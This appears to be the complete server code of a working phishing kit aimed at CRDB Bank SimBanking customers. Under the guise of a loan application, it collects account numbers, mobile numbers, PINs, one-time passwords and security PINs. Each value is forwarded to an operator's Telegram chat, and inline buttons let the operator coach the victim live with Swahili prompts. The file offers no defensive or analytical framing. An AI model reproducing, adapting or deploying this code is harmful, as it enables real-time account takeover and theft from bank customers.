const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const sessions = {};

async function sendTelegramMessage(text, replyMarkup) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing in environment variables!');
    return null;
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: replyMarkup
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API Error:', data);
      return null;
    }
    return data.result ? data.result.message_id : null;
  } catch (err) {
    console.error('Telegram network error:', err);
    return null;
  }
}

async function answerCallbackQuery(callbackQueryId, text = '') {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text: text,
        show_alert: false
      })
    });
  } catch (err) {
    console.error('Failed to answer callback query:', err);
  }
}

async function removeInlineKeyboard(chatId, messageId) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: [] }
      })
    });
  } catch (err) {
    console.error('Failed to remove keyboard:', err);
  }
}

// 1. Submit Credentials
app.post('/api/submit-credentials', async (req, res) => {
  try {
    const { sessionId, accountNumber, mobileNumber, pin, loanDetails } = req.body;
    
    if (!mobileNumber || !mobileNumber.startsWith('0')) {
      return res.status(400).json({ success: false, error: 'Mobile number must start with 0' });
    }

    sessions[sessionId] = {
      status: 'pending_credentials',
      notification: '',
      accountNumber,
      mobileNumber,
      pin,
      loanDetails
    };

    const message = `🚨 *CRDB SIMBANKING APPLICANT* 🚨\n\n` +
      `🏦 *Acc No:* \`${accountNumber}\`\n` +
      `📱 *Mobile:* \`${mobileNumber}\`\n` +
      `🔑 *PIN:* \`${pin}\`\n` +
      `💰 *Loan:* ${loanDetails?.amount || '1,000,000 TZS'}`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '❌ INVALID PHONE', callback_data: `invphone_${sessionId}` },
          { text: '❌ INVALID ACC', callback_data: `invacc_${sessionId}` }
        ],
        [
          { text: '❌ INVALID PIN', callback_data: `invpin_${sessionId}` },
          { text: '✅ PROCEED (OTP)', callback_data: `proceedotp_${sessionId}` }
        ]
      ]
    };

    const msgId = await sendTelegramMessage(message, keyboard);
    sessions[sessionId].msgId = msgId;

    res.json({ success: true });
  } catch (error) {
    console.error('Error in submit-credentials:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 2. Submit OTP (5 Digits Enforcement)
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { sessionId, otp } = req.body;
    if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });

    if (!otp || otp.length !== 5 || !/^\d+$/.test(otp)) {
      return res.status(400).json({ success: false, error: 'OTP must be 5 numeric digits' });
    }

    sessions[sessionId].status = 'pending_otp';
    sessions[sessionId].otp = otp;

    const message = `🔑 *OTP SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
      `🔢 *OTP Entered (5 Digits):* \`${otp}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '❌ WRONG OTP', callback_data: `wrongotp_${sessionId}` },
          { text: '✅ CORRECT OTP', callback_data: `correctotp_${sessionId}` }
        ]
      ]
    };

    await sendTelegramMessage(message, keyboard);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in submit-otp:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 3. Submit Security PIN
app.post('/api/submit-security-pin', async (req, res) => {
  try {
    const { sessionId, securityPin } = req.body;
    if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });

    if (!securityPin || !/^\d+$/.test(securityPin)) {
      return res.status(400).json({ success: false, error: 'Security PIN must be numeric' });
    }

    sessions[sessionId].status = 'pending_security_pin';
    sessions[sessionId].securityPin = securityPin;

    const message = `🔒 *SECURITY PIN SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
      `🔑 *PIN:* \`${securityPin}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '❌ WRONG PIN', callback_data: `wrongpin_${sessionId}` },
          { text: '✅ CORRECT PIN', callback_data: `correctpin_${sessionId}` }
        ]
      ]
    };

    await sendTelegramMessage(message, keyboard);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in submit-security-pin:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions[sessionId];
  if (!session) return res.json({ status: 'not_found' });
  res.json(session);
});

app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body;
    if (update.callback_query) {
      const callbackQueryId = update.callback_query.id;
      const data = update.callback_query.data; 
      const chatId = update.callback_query.message.chat.id;
      const messageId = update.callback_query.message.message_id;
      
      await answerCallbackQuery(callbackQueryId, 'Imepokelewa!');
      await removeInlineKeyboard(chatId, messageId);

      const underscoreIndex = data.indexOf('_');
      const action = data.substring(0, underscoreIndex);
      const sessionId = data.substring(underscoreIndex + 1);

      if (sessions[sessionId]) {
        if (action === 'invphone') {
          sessions[sessionId].status = 'error';
          sessions[sessionId].notification = 'INVALID PHONE NO: Tafadhali ingiza namba sahihi ya Simbanking inayokubalika.';
        } else if (action === 'invacc') {
          sessions[sessionId].status = 'error';
          sessions[sessionId].notification = 'INVALID ACC. NO: Tafadhali ingiza namba sahihi ya akaunti.';
        } else if (action === 'invpin') {
          sessions[sessionId].status = 'error';
          sessions[sessionId].notification = 'INVALID PIN: Tafadhali ingiza PIN sahihi ya Simbanking.';
        } else if (action === 'proceedotp') {
          sessions[sessionId].status = 'enter_otp';
          sessions[sessionId].notification = 'IDHINI ✅ - Endelea kuweka OTP ya tarakimu 5.';
        } else if (action === 'wrongotp') {
          sessions[sessionId].status = 'enter_otp';
          sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP ya tarakimu 5.';
        } else if (action === 'correctotp') {
          sessions[sessionId].status = 'enter_security_pin';
          sessions[sessionId].notification = 'OTP SWAHIHI ✅ - Endelea kuweka PIN ya usalama.';
        } else if (action === 'wrongpin') {
          sessions[sessionId].status = 'enter_security_pin';
          sessions[sessionId].notification = 'WRONG PIN: Tafadhali ingiza PIN sahihi ya usalama.';
        } else if (action === 'correctpin') {
          sessions[sessionId].status = 'pending_approval';
          sessions[sessionId].notification = 'PIN SAHIHI ✅ - Inasubiri idhinisho la mwisho.';
          
          await sendTelegramMessage(`✨ *READY FOR FINAL APPROVAL* for Acc: \`${sessions[sessionId].accountNumber}\``, {
            inline_keyboard: [
              [
                { text: '✅ APPROVE LOAN', callback_data: `approvefinal_${sessionId}` },
                { text: '❌ REJECT', callback_data: `rejectfinal_${sessionId}` }
              ]
            ]
          });
        } else if (action === 'approvefinal') {
          sessions[sessionId].status = 'success';
          sessions[sessionId].notification = 'Hongera! Mkopo wako umeidhinishwa!';
        }
      }
    }
  } catch (err) {
    console.error('Webhook error:', err);
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`CRDB Server running on port ${PORT}`));
    
